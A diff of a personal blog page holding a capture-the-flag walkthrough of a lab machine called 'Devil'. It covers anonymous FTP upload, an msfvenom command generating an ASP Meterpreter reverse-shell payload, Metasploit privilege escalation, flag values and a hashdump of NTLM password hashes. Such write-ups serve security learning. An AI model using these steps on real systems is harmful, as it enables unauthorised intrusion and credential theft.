@@ -1,170 +1,179 @@
-
-<!doctype html>
-<html lang="en-us">
-  <head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="generator" content="Hugo 0.74.3">
+    <meta name="description" content="">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="The Ultimate eCPPTv2 Writeup">
+    <meta name="twitter:description" content="Who am I? I decided to take this exam when I was six months away from graduating college with a bachelor’s degree in Cyber Security. The reason I wanted to take this exam was that I was dying to get a job in Cyber Security as a penetration tester and I did not feel like my degree gave me the knowledge or experience needed to get into the security role I wanted.">
+    <meta property="og:title" content="The Ultimate eCPPTv2 Writeup">
+    <meta property="og:description" content="Who am I? I decided to take this exam when I was six months away from graduating college with a bachelor’s degree in Cyber Security. The reason I wanted to take this exam was that I was dying to get a job in Cyber Security as a penetration tester and I did not feel like my degree gave me the knowledge or experience needed to get into the security role I wanted.">
+    <meta property="og:type" content="article">
+    <meta property="article:published_time" content="2021-05-16T21:53:31-04:00">
+    <meta property="article:modified_time" content="2021-05-16T21:53:31-04:00">
     <title>Devil Writeup</title>
-    <link rel="shortcut icon" href="/favicon.ico" />
-    <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.74.3" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="description" content="" />
-    <link rel="stylesheet" href="web2.css" />
-
-    
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="The Ultimate eCPPTv2 Writeup"/>
-<meta name="twitter:description" content="Who am I? I decided to take this exam when I was six months away from graduating college with a bachelor&rsquo;s degree in Cyber Security. The reason I wanted to take this exam was that I was dying to get a job in Cyber Security as a penetration tester and I did not feel like my degree gave me the knowledge or experience needed to get into the security role I wanted."/>
-
-<meta property="og:title" content="The Ultimate eCPPTv2 Writeup" />
-<meta property="og:description" content="Who am I? I decided to take this exam when I was six months away from graduating college with a bachelor&rsquo;s degree in Cyber Security. The reason I wanted to take this exam was that I was dying to get a job in Cyber Security as a penetration tester and I did not feel like my degree gave me the knowledge or experience needed to get into the security role I wanted." />
-<meta property="og:type" content="article" />
-<meta property="article:published_time" content="2021-05-16T21:53:31-04:00" />
-<meta property="article:modified_time" content="2021-05-16T21:53:31-04:00" />
-
-
-  </head>
-  <body>
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="web2.css">
+</head>
+<body>
     <header class="app-header">
-      <a href="https://kevhjelm.github.io/"><img class="app-header-avatar" src="me2.jpg" alt="kevhjelm" /></a>
-      <h1>Kevin Hjelmtveit</h1>
-      <nav class="app-header-menu">
-          <a class="app-header-menu-item" href="index.html">Home</a>
-             - 
-          
-          <a class="app-header-menu-item" href="Menu.html">Menu</a>
-      </nav>
-      <p>  </p>
-      <div class="app-header-social">
-        
-          <a href="https://github.com/kevhjelm" target="_blank" rel="noreferrer noopener">
-            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
-  <title>Github</title>
-  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
-</svg>
-          </a>
-
-        
-          <a href="https://linkedin.com/in/kevhjelm/" target="_blank" rel="noreferrer noopener">
-            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
-  <title>LinkedIn</title>
-  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
-</svg>
-          </a>
-        
-      </div>
+        <a href="https://kevhjelm.github.io/">
+            <img class="app-header-avatar" src="me2.jpg" alt="Kevin Hjelmtveit">
+        </a>
+        <h1>Kevin Hjelmtveit</h1>
+        <nav class="app-header-menu">
+            <a class="app-header-menu-item" href="index.html">Home</a> -
+            <a class="app-header-menu-item" href="Menu.html">Menu</a>
+        </nav>
+        <div class="app-header-social">
+            <a href="https://github.com/kevhjelm" target="_blank" rel="noopener noreferrer">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+                    <title>Github</title>
+                    <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+                </svg>
+            </a>
+            <a href="https://linkedin.com/in/kevhjelm/" target="_blank" rel="noopener noreferrer">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+                    <title>LinkedIn</title>
+                    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+                    <rect x="2" y="9" width="4" height="12"></rect>
+                    <circle cx="4" cy="4" r="2"></circle>
+                </svg>
+            </a>
+        </div>
     </header>
     <main class="app-container">
-      
-  <article class="post">
-    <header class="post-header">
-      <h1 class ="post-title">Devil Writeup</h1>
-      <img src="images//devil/devil_0.png" alt="" width="100" height="100" />
-      <div class="post-meta">
-        <div>
-          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
-  <title>calendar</title>
-  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
-</svg>
-          Oct 1, 2020
-        </div>
-        <div>
-          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
-  <title>clock</title>
-  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
-</svg>
-          13 min read
-        </div>
-      </div>
-    </header>
-    <div class="post-content">
-      <h1 id="who-am-i">Who am I?</h1> 
-      Devil is rated as an medium machine
-<p>
-  <img src="images//devil/devil0.PNG" alt="" width="500" height="150" />
-  <img src="images//devil/devil_1.PNG" alt="" width="500" height="150" />
-
-</p>
-<h1 id="exam-timeline">NMAP result</h1>
-<img src="images//devil/nmap_image_1.png" alt="n" class="center">
-<img src="images//devil/nmap_image_2.png" alt="" class="center">
-<p>We see FTP port 21 wiht Anonymous login. Port 80 is also open  </p>
-<h3>HTTP</h3>
-<p>When we deal with a website, I like to open dirbuster for hidden directory</p>
-<img src="images//devil/80_image_1.png" width="8000" height="300" />
-<h3>FTP</h3>
-<img src="images//devil/21_image_1.png" />
-<p> We start with logging to the ftwp with Anonymous user
-We downloaded the data to look for clues</p>
-<img src="images//devil/21_image_2.png" /><br>
-<img src="images//devil/21_image_3.png" />
-<p>We used the <b>put</b> command and manage to add a file to the FTP</p>
-<img src="images//devil/21_image_4.png" />
-<img src="images//devil/21_image_5.png" />
-<p>Since we are able to put files and execute them, we can add malware to the website
-We are going to generate a malware, with msfvenom source.
-Since it is a windows server we know it is using ASP
-<pre>
-  msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;your_ip_address&gt; LPORT=&lt;your_port&gt; -f asp &gt; shell.asp
-  </pre>
-  
-<p>
-    In Metasploit, use the following commands:
-</p>
-<p>
-    show options &rarr; set lhost 10.10.14.14
-</p>
-<p>
-    meterpreter &gt; hashdump
-</p>
-
-<img src="images//devil/images//devil/21_image_6.png" />
-<p>The above image did not work, we dont know if the windows system is a x64 or x86. WHen trying the above command our multi handler was listening and nothing happend. We then tried to do it again with a x86.</p>
-<img src="images//devil/21_image_7.png" />
-<p>WE can see that we are not system</p>
-<img src="images//devil/21_image_8.png" />
-<p>Meaning we can run some commands, we tried using getsystem but now luck.
-What we can try to do is to try run a post exploit which will try to find ways for us to be system,
-we but or current session in the background (ctrl+z, y) and go back to msfconsole</p>
-<img src="images//devil/21_image_9.png" />
-<img src="images//devil/21_image_10.png" /><br>
-<img src="images//devil/21_image_11.png" />
-<p>We are not system(root)
-what we can do is to run a post exploit that will find ways for use to be system
-We could try all of them, but let go with of that works, the post module found ways for use to get root
-We tried the first suggestion</p>
-<img src="images//devil/21_image_12.png" />
-<img src="images//devil/21_image_13.png" />
-<p>This wont works insce the handler is using 192.168.1.134, this is not our local host, we need to
-show options -> set lhost 10.10.14.14</p>
-<img src="images//devil/21_image_14.png" />
-<p>port 4444 is already used</p>
-<img src="images//devil/21_image_15.png" />
-<p>We got a meterpreter shell and this time we are root</p>
-<img src="images//devil/21_image_16.png" />
-<img src="images//devil/21_image_17.png" />
-<p>it seems to be a user with the name "babis" here lets hunt for flags, we go to c and tab for options</p>
-<img src="images//devil/21_image_18.png" />
-<img src="images//devil/21_image_19.png" />
-<p><b>root: e621a0b5041708797c4fc4728bc72b4b</b>
-earlier we found a user named babies, we found her desktop and found the flag
-noticed the ".txt.txt"</p>
-
-<img src="images//devil/21_image_20.png" />
-<p><b>user: 9ecdd6a3aedf24b41562fea70f4cb3e8</b></p>
-<p>Extra, but no luck
-meterpreter > hashdump
+        <article class="post">
+            <header class="post-header">
+                <h1 class="post-title">Devil Writeup</h1>
+                <img src="images/devil/devil_0.png" alt="Devil Machine" width="100" height="100">
+                <div class="post-meta">
+                    <div>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+                            <title>Calendar</title>
+                            <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                            <line x1="16" y1="2" x2="16" y2="6"></line>
+                            <line x1="8" y1="2" x2="8" y2="6"></line>
+                            <line x1="3" y1="10" x2="21" y2="10"></line>
+                        </svg>
+                        Oct 1, 2020
+                    </div>
+                    <div>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+                            <title>Clock</title>
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <polyline points="12 6 12 12 16 14"></polyline>
+                        </svg>
+                        13 min read
+                    </div>
+                </div>
+            </header>
+            <div class="post-content">
+                <h2 id="who-am-i">Who am I?</h2>
+                <p>Devil is rated as a medium machine.</p>
+                <img src="images/devil/devil0.PNG" alt="Screenshot 1" width="500" height="150">
+                <img src="images/devil/devil_1.PNG" alt="Screenshot 2" width="500" height="150">
+                <h2 id="nmap-result">NMAP Result</h2>
+                <img src="images/devil/nmap_image_1.png" alt="Nmap Result 1" class="center">
+                <img src="images/devil/nmap_image_2.png" alt="Nmap Result 2" class="center">
+                <p>We see FTP port 21 with Anonymous login. Port 80 is also open.</p>
+                <h3>HTTP</h3>
+                <p>When working with a website, I like to use DirBuster to search for hidden directories.</p>
+                <img src="images/devil/80_image_1.png" alt="HTTP Scan" width="800">
+                <h3>FTP</h3>
+                <p>We start by logging into FTP as an Anonymous user. We downloaded the data to look for clues.</p>
+                <img src="images/devil/21_image_1.png" alt="FTP Step 1">
+                <p>Using the <b>put</b> command, we managed to upload a file to the FTP server.</p>
+                <img src="images/devil/21_image_2.png" alt="FTP Step 2">
+                <img src="images/devil/21_image_3.png" alt="FTP Step 3">
+                <p>
+                    Since we are able to upload and execute files, we can add malware to the website.
+                    We will generate malware using <code>msfvenom</code>. Since it is a Windows server, 
+                    we know it uses ASP.
+                </p>
+                <pre>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;your_ip_address&gt; LPORT=&lt;your_port&gt; -f asp &gt; shell.asp
+                </pre>
+                <p>In Metasploit, use the following commands:</p>
+                <ul>
+                    <li><code>show options → set LHOST 10.10.14.14</code></li>
+                    <li><code>meterpreter > hashdump</code></li>
+                </ul>
+                <img src="images/devil/21_image_6.png" alt="First Attempt Result">
+                <p>
+                    The above image did not work. We don’t know if the Windows system is x64 or x86. 
+                    When trying the above command, our multi-handler was listening, but nothing happened. 
+                    We then tried again with x86.
+                </p>
+                <img src="images/devil/21_image_7.png" alt="x86 Attempt">
+                <p>We can see that we are not <code>System</code>.</p>
+                <img src="images/devil/21_image_8.png" alt="Not System">
+                <p>
+                    This means we can run some commands, but attempts to use <code>getsystem</code> 
+                    did not succeed. We will try running a post-exploit module to find a way to 
+                    elevate our privileges to <code>System</code>.
+                    First, we place the current session in the background (<code>Ctrl+Z, Y</code>) 
+                    and return to <code>msfconsole</code>.
+                </p>
+                <img src="images/devil/21_image_9.png" alt="Background Session">
+                <img src="images/devil/21_image_10.png" alt="Post Exploit Attempt 1">
+                <br>
+                <img src="images/devil/21_image_11.png" alt="Post Exploit Attempt 2">
+                <p>
+                    We are not <code>System</code> yet. We can try running post-exploitation modules 
+                    that find ways to escalate our privileges. The post module identified methods 
+                    to gain <code>System</code>. We chose the first suggestion.
+                </p>
+                <img src="images/devil/21_image_12.png" alt="Post Exploit Success">
+                <img src="images/devil/21_image_13.png" alt="Post Exploit Module Output">
+                <p>
+                    This attempt failed because the handler was configured with 
+                    <code>192.168.1.134</code>, which is not our local host. 
+                    We corrected this by running:
+                </p>
+                <ul>
+                    <li><code>show options → set LHOST 10.10.14.14</code></li>
+                </ul>
+                <img src="images/devil/21_image_14.png" alt="Set LHOST Correction">
+                <p>Port 4444 was already in use.</p>
+                <img src="images/devil/21_image_15.png" alt="Port Already in Use">
+                <p>We got a Meterpreter shell, and this time we are root.</p>
+                <img src="images/devil/21_image_16.png" alt="Meterpreter Root">
+                <img src="images/devil/21_image_17.png" alt="Shell as Root">
+                <p>
+                    It seems there is a user named <code>babis</code>. Let’s hunt for flags. 
+                    We navigated to <code>C:\</code> and used <code>tab</code> to autocomplete 
+                    directory options.
+                </p>
+                <img src="images/devil/21_image_18.png" alt="Exploring C Drive">
+                <img src="images/devil/21_image_19.png" alt="User Directory Found">
+                <p>
+                    <b>Root flag:</b> <code>e621a0b5041708797c4fc4728bc72b4b</code>
+                </p>
+                <p>
+                    Earlier, we found a user named <code>babis</code>. We located her desktop and 
+                    found the user flag. Note the <code>.txt.txt</code> file extension.
+                </p>
+                <img src="images/devil/21_image_20.png" alt="User Flag Found">
+                <p>
+                    <b>User flag:</b> <code>9ecdd6a3aedf24b41562fea70f4cb3e8</code>
+                </p>
+                <p>
+                    Extra attempt (but no success):
+                    <code>meterpreter > hashdump</code>
+                </p>
+                <pre>
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:a450f6000be7df50ee304d0a838d638f:::
 babis:1000:aad3b435b51404eeaad3b435b51404ee:a1133ec0f7779e215acc8a36922acf57:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p>
-<img src="images//devil/21_image_21.png" />
-<h3 id="looking-back-5">Conclusion</h3>
-<p> </p>
-    </div>
-    <div class="post-footer">
-      
-    </div>
-  </article>
-
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+                </pre>
+                <img src="images/devil/21_image_21.png" alt="Hashdump Results">
+                <h3 id="looking-back-5">Conclusion</h3>
+                <p>This concludes the writeup for Devil. The machine provided excellent learning opportunities.</p>
+            </div>
+        </article>
     </main>
-  </body>
+</body>
 </html>
